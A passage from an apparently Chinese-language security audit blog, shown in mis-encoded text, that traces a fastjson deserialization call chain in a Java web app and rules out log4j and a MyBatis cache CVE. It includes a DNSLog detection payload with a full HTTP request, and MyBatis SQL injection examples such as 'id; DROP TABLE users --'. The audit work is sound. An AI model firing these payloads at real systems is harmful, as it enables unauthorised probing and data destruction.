<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·¯å¾„å˜é‡ &#123;apiName&#125; </span><br><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      //search å¯ä¼ å…¥ payload</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//å‚æ•°å…¨éƒ¨æ”¾å…¥ Mapï¼Œè¿›è¡Œåç»­å¤„ç†</span><br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br></code></pre></td></tr></table></figure>

<hr>
<p><strong>å°ç»“åˆ©ç”¨é“¾ï¼š</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>-&gt;<br><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>-&gt;<br><span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>-&gt;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>-&gt;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>-&gt;<br>turn <span class="hljs-title function_">parse</span><span class="hljs-params">(text, DEFAULT_PARSER_FEATURE)</span>;<br>-&gt;<br><span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>-&gt;<br><span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>-&gt;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br>-&gt;<br>Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br>-&gt;<br><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>-&gt;<br>clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) <br>-&gt;<br><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><br></code></pre></td></tr></table></figure>



<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>@typeï¼šæŒ‡å®š fastjson è¦å®ä¾‹åŒ–çš„ç±»ï¼Œ valï¼šè¿™ä¸ªç±»çš„æŸä¸ªå­—æ®µå€¼  </p>
<p><code>Inet4Address</code> åªèƒ½è§£æ IP&#x2F;åŸŸåï¼Œä¸èƒ½è§¦å‘ LDAP è¯·æ±‚  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.28.192.1:8123<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="æ–­ç‚¹è°ƒè¯•ï¼š"><a href="#æ–­ç‚¹è°ƒè¯•ï¼š" class="headerlink" title="æ–­ç‚¹è°ƒè¯•ï¼š"></a>æ–­ç‚¹è°ƒè¯•ï¼š</h4><p>è°ƒè¯•è¿‡ç¨‹åŸºæœ¬å’Œâ€œåˆ†æé“¾â€ä¸­ä¸€è‡´ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png" srcset="/img/loading.gif" lazyload></p>
<p><font style="color:rgb(34, 34, 38);"></font></p>
<blockquote>
<p><font style="color:rgb(34, 34, 38);">é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³•ï¼ˆ</font>java.net.Inet4Addressã€Inet6Addressã€InetSocketAddressï¼Œurlï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
</blockquote>
<h4 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">HTTP GET è¯·æ±‚ ï¼š/user/list?search=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span>&#125;<br>-&gt;	ResourceController.java<br><span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                        HttpServletRequest request)</span><br>-&gt;	UserComponent.java<br>getUserList#getInfo(search)<br>-&gt;<br>JSONObject.parseObject(search)<br>-&gt;<br>DefaultJSONParser<br>-&gt;<br>parse <br>-&gt;<br>checkAutoType<br>-&gt;<br>loadClass<br>-&gt;<br>TypeUtils.loadClass<br>-&gt;<br>config.getDeserializers().get(clazz)<br>-&gt;<br>Inet4Address<br>-&gt;<br>MiscCodec#ObjectDeserializer<br>-&gt;<br><span class="hljs-keyword">return</span> InetAddress.getByName(strVal); <span class="hljs-comment">//å°†strValä½œä¸ºä¸»æœºå,è·å–å…¶å¯¹åº”çš„ipï¼ŒåŸŸååœ¨æ­¤å¤„è¢«è§£æ</span><br></code></pre></td></tr></table></figure>



<h3 id="2-2-log4j-ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#2-2-log4j-ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="2.2 log4j ï¼ˆä¸å­˜åœ¨ï¼‰"></a>2.2 log4j ï¼ˆä¸å­˜åœ¨ï¼‰</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png" srcset="/img/loading.gif" lazyload></p>
<p>å¹¶æ²¡æœ‰å¯¼å…¥ log4j-core åŒ…ï¼Œå•ç‹¬çš„ log4j-to-slf4j  æ˜¯ä¸å­˜åœ¨æ¼æ´çš„</p>
<p><code>log4j-to-slf4j</code> æ˜¯ä¸€ä¸ª <strong>æ¡¥æ¥å™¨ï¼ˆbridgeï¼‰</strong>ï¼Œå®ƒæŠŠ Log4j 2 API çš„è°ƒç”¨è½¬å‘åˆ° SLF4Jï¼Œç”± SLF4J æ¥çœŸæ­£æ‰“å°  </p>
<h3 id="2-3-MyBatis-CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#2-3-MyBatis-CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="2.3 MyBatis CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰"></a>2.3 MyBatis <strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="æ¼æ´ç‚¹åˆ†æï¼š"><a href="#æ¼æ´ç‚¹åˆ†æï¼š" class="headerlink" title="æ¼æ´ç‚¹åˆ†æï¼š"></a>æ¼æ´ç‚¹åˆ†æï¼š</h4><p><font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//ä»åº•å±‚çš„ delegateï¼ˆè¢«ä»£ç†çš„å¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªç¼“å­˜æˆ–Mapï¼‰ä¸­å–å€¼</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> delegate.getObject(key);<br>    <span class="hljs-comment">// å¦‚æœå–åˆ°çš„å€¼æ˜¯ null(è¿‡æœŸ)ï¼Œç›´æ¥è¿”å› nullï¼›</span><br>    <span class="hljs-comment">// å¦åˆ™å°†å–åˆ°çš„å€¼å¼ºè½¬ä¸º byte[]ï¼Œå†è°ƒç”¨ deserialize æ–¹æ³•ååºåˆ—åŒ–ï¼Œæ¢å¤æˆåŸæ¥çš„å¯¹è±¡</span><br>    <span class="hljs-comment">//deserialize((byte[]) object) å°±æ˜¯ RCE çš„è§¦å‘ç‚¹äº†</span><br>    <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : deserialize((<span class="hljs-type">byte</span>[]) object);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿› delegate.getObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cache</span> &#123;<br>    ...<br>    Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>getObject    ctrl+alt+å·¦é”® è½¬åˆ°å£°æ˜</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png" srcset="/img/loading.gif" lazyload></p>
<p> è·Ÿè¿›åˆ° ScheduledCache  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//clearWhenStale() æ£€æŸ¥ç¼“å­˜æ˜¯å¦â€œè¿‡æœŸâ€</span><br>    <span class="hljs-keyword">return</span> clearWhenStale() ? <span class="hljs-literal">null</span> : delegate.getObject(key);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">clearWhenStale</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (System.currentTimeMillis() - lastClear &gt; clearInterval) &#123;<br>        clear();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a><font style="color:rgb(34, 34, 34);">åˆ©ç”¨æ¡ä»¶</font></h4><ol>
<li><font style="color:rgb(53, 53, 53);">ç”¨æˆ·å¯ç”¨äº†äºŒçº§ç¼“å­˜åŠŸèƒ½</font></li>
</ol>
<blockquote>
<p><font style="color:rgb(53, 53, 53);">äºŒçº§ç¼“å­˜å…¶å®å°±æ˜¯å°†æŸ¥è¯¢çš„ç»“æœï¼Œæ”¾å…¥ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡æŸ¥è¯¢ç›¸åŒçš„æ¡ä»¶æ—¶ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è·å–ç»“æœï¼Œé™ä½sqlæœåŠ¡å™¨çš„å‹åŠ›</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ol start="2">
<li><font style="color:rgb(53, 53, 53);">æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç¼“å­˜çš„å†…å®¹ï¼Œæ›¿æ¢ä¸ºæ¶æ„ååºåˆ—åŒ–æ•°æ®</font></li>
<li><font style="color:rgb(53, 53, 53);">ç”¨æˆ·æœªè®¾ç½®JEP-290è¿‡æ»¤ï¼Œä¸”æ²¡æœ‰ä»»ä½•é˜²å¾¡ååºåˆ—åŒ–æ”»å‡»çš„æªæ–½</font></li>
</ol>
<blockquote>
<p><strong>JEP-290 æ˜¯ä» Java 9 å¼€å§‹å¼•å…¥çš„</strong>ï¼Œåœ¨ Java 8 é‡Œ <strong>ä¸å­˜åœ¨å…¨å±€æˆ–ç±»çº§åºåˆ—åŒ–è¿‡æ»¤å™¨</strong> çš„æœºåˆ¶  </p>
</blockquote>
<p><strong>ç”±äºæ‰¾ä¸åˆ°å¯ä¿®æ”¹çš„ç¼“å­˜å†…å®¹ï¼Œè¿™éƒ¨åˆ†å°±ä½œä¸ºæ¼æ´å­¦ä¹ ä¸€éï¼Œæœ¬ç³»ç»Ÿä¸å­˜åœ¨æ­¤æ¼æ´</strong></p>
<h2 id="æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š"><a href="#æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š" class="headerlink" title="æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š"></a>æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š</h2><ol>
<li>SQL æ³¨å…¥</li>
<li><del>æ–‡ä»¶å®‰å…¨ ï¼ˆåœ¨ç¿»æ‰¾åŠŸèƒ½ç‚¹è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰å‘ç°æœ‰èƒ½ä¸Šä¼ &amp;è¯»å–æ–‡ä»¶çš„ç‚¹ï¼‰</del></li>
<li>èº«ä»½éªŒè¯&amp;é‰´æƒ ï¼ˆLogCostFilter.javaï¼‰</li>
<li>ç¬¬ä¸‰æ–¹ç»„ä»¶&amp;ä¾èµ– ï¼ˆå·²åˆ†æï¼‰</li>
</ol>
<h2 id="3ã€Mybatis-SQL-æ³¨å…¥"><a href="#3ã€Mybatis-SQL-æ³¨å…¥" class="headerlink" title="3ã€Mybatis SQL æ³¨å…¥"></a>3ã€Mybatis SQL æ³¨å…¥</h2><p>Mybatisæ¡†æ¶çš„sqlæ³¨å…¥å…³æ³¨<code>${}</code>ï¼š</p>
<p><code>${}</code>ç”¨äºç›´æ¥æ›¿æ¢SQLè¯­å¥ä¸­çš„å ä½ç¬¦ï¼Œè€Œ<code>#{}</code>ç”¨äºé¢„ç¼–è¯‘</p>
<ol>
<li>likeæ¨¡ç³ŠæŸ¥è¯¢</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span><br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%%&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>åŠ¨æ€åˆ—å &#x2F; è¡¨å</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> $&#123;<span class="hljs-keyword">column</span>&#125; <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> #&#123;id&#125;<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br><span class="hljs-keyword">column</span> <span class="hljs-operator">=</span> &quot;username, password from users --&quot;<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- FROM users WHERE id = ?</span><br></code></pre></td></tr></table></figure>

<ol start="3">
<li>Order By</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $&#123;sortColumn&#125;<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br>sortColumn <span class="hljs-operator">=</span> &quot;id; DROP TABLE users --&quot;<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>IN</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> ($&#123;ids&#125;)<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br>mapper.findByIds(&quot;1,2,3 OR 1=1&quot;);<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>



<h3 id="AccoutMapperEx-xml"><a href="#AccoutMapperEx-xml" class="headerlink" title="AccoutMapperEx.xml"></a>AccoutMapperEx.xml</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥ä¸‹æ¥è€ƒè™‘Controller&#x2F;Service ä¸­æ˜¯å¦ä¼ å…¥äº† name å‚æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">selectï¼Œ</font></p>
<p><font style="color:#080808;background-color:#ffffff;"> ä»è¯·æ±‚å‚æ•° map ä¸­è§£ææœç´¢æ¡ä»¶  </font></p>
